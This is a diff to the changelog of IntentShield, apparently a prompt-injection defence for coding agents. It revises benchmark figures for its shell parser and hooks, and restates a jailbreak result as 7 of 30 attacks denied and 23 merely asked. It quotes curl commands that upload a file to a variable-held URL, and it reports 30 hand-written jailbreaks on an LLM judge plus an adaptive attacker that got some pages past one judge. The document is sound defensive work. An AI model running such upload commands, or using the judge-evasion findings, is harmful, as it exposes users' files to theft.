@@ -12,7 +12,7 @@
   read-only. Three backstops independent of the parser: only plain syntax is read-only, every address in the
   raw text (also with escapes decoded and variables taken out) is a destination, and a sender next to one in
   the same statement sends. Parsing is linear (200,000 characters in 0.06 to 0.12 s, was 45 to 94 s); commands
-  over 100,000 characters are read from the raw text. Benign cost: shell asks on 40 real sessions from other
+  over 100,000 characters are read from the raw text. Benign cost: shell asks on 40 private (uncommitted) sessions from other
   projects went from 7 to 8 of 1,713; in IntentShield's own sessions flagged by injected outputs, from 830 to
   1,066 of 3,720. Open residuals are listed in `docs/security-review.md`.
 - **Cursor:** with `--builtin-tools`, `beforeShellExecution` now checks each shell command before it runs.
@@ -32,12 +32,12 @@
 - **Provenance:** a host a tool output names bare or as an email's domain now covers its subdomains, except
   under popular sites and registry suffixes. The review gate's output was byte-identical.
 - **Shell parser:** reads `eval` and variables the command assigns itself, so `C="curl -F f=@x URL"; $C` and
-  `U=URL; curl -d @x $U` show their destination. On 40 real sessions from other projects, shell asks went from
+  `U=URL; curl -d @x $U` show their destination. On 40 private sessions from other projects (not committed), shell asks went from
   4 to 7 of 1,707: each of the three put the user's own site, first seen in a tool output, in a variable, and
   asks as the same command written out would.
 - **Relative paths:** the hooks join relative paths to the event's working directory, so `secrets/keys.json`
   in a call meets `/Users/me/proj/secrets/keys.json` in an output, while one the user named stays theirs. On
-  40 real sessions from other projects, MCP asks went from 53 to 55 of 126. `benchmarks/shell_replay.py` now
+  40 private (uncommitted) sessions from other projects, MCP asks went from 53 to 55 of 126. `benchmarks/shell_replay.py` now
   passes each transcript's working directory to the hook.
 - **Installer:** `install`, `wrap` and `unwrap` write nothing if the settings file changed after they read it
   (Claude Code rewrites `~/.claude.json` often), so a harness's own write is never overwritten; run again.
@@ -133,8 +133,8 @@ still open in `docs/security-review.md`. Behaviour changes, so read the list bef
 - New benchmarks: `benchmarks/judge_jailbreaks.py` (30 hand-written attacks on the judge and 12 benign
   controls, through the real hook) and `benchmarks/adaptive_judge.py` (an LLM attacker that sees the
   judge's prompt and verdicts, against a local agent).
-  Through the hook, without a judge, all 30 jailbreak sends are stopped (27 before) and none of the 12 benign
-  ones asked; with Gemini as the judge all 30 results are warned on with no false asks, with qwen2.5:7b
+  Through the hook, without a judge, 7 of the 30 jailbreak sends are denied and 23 asked (27 held before; an ask
+  is not a stop) and none of the 12 benign ones asked; with Gemini as the judge all 30 results are warned on with no false asks, with qwen2.5:7b
   at 4 false asks of 12. The adaptive attacker evaded on 0 of 24 seeds (1 of 24 with the old prompt), but
   got 34 of 120 pages past the qwen judge; the agent followed none of them.
 
